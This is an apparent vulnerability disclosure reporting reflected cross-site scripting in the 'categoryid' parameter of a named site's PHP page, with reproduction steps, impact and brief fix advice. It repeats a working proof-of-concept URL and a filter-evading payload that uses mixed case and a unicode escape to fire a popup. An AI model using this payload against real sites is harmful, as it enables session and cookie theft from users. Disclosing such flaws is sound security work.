# Reflected Cross-Site Scripting (XSS) via `categoryid` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `categoryid` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="g4n8qp"
http://kzlabs.com/punishment/20.php?categoryid=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="x6k1vz"
categoryid
```

---

## Payload Used

```html id="r2m9df"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/20.php?categoryid=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="p5v7nc"
http://kzlabs.com/punishment/20.php?categoryid=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/c30e2e9d-8b65-4aa3-a6f7-cb9eda529ef0" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
